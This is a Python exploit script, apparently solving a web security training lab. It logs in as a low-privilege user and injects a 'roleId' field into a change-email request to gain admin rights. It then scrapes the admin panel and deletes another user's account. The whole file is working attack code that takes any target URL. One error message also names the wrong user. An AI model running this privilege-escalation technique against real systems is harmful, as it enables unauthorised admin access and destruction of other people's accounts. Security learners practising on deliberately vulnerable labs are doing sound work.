import requests
import sys
import re
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def broken_authentification_exploit(session, url) :
    exploit_url = url + "/login"
    data_login = {"username":"wiener","password":"peter"}
    r = session.post(exploit_url, data=data_login, verify=False, proxies=proxies)
    
    if "Log out" in r.text :
        print("(+) The wiener has logged in successfully!")
        print("(+) Upgrading to admin privilege.")
        
        change_email_url = url + "/my-account/change-email"
        data_email = {'email':'wiener@normal-user.net','roleId':'2'}
        r = session.post(change_email_url, json=data_email, verify=False, proxies=proxies)
        
        if "Admin panel" in r.text :
            print("(+) Successfully access to the admin panel page.")
            r = session.get(url+"/admin", verify=False, proxies=proxies)
            
            pattern = r'<a href="(.*carlos)">Delete</a>'
            match = re.search(pattern, r.text)
            
            if match :
                captured_url = match.group(1)
                print(captured_url)
                delete_url = url + captured_url
                
                r = session.post(delete_url, verify=False, proxies=proxies)
                
                if "User deleted successfully!" in r.text :
                    print("(+) The carlos user has been deleted successfully!")
                else :
                    print("(-) Could not delete the carlos user!")
            else:
                print("No match found.")
        else :
            print('(-) Could not access the admin panel page.')
    else :
        print("(-) Could not login as the carlos user!")

if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)